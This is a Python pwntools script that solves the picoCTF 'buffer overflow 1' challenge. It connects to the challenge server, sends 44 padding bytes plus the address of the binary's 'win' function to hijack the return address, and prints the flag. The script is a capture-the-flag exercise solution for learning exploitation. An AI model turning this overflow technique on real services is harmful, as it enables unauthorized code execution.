import os
from pwn import *
###################setup file and elf files####################
level = "buffer overflow 1"
ip = "saturn.picoctf.net:55769"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

elf = ELF("./vuln")
######################start process##########################
#for local it is not  working
# r = process("./vuln")
r = remote(ip.split(':')[0], ip.split(':')[1])

##############simple overflow code###################

overflow = b'a'*44
payload = overflow + struct.pack('I', elf.symbols['win'])
r.sendlineafter(":", payload)

#####################collecting result and shell#######################

flag = r.recvall()
log.info(flag)
r.close()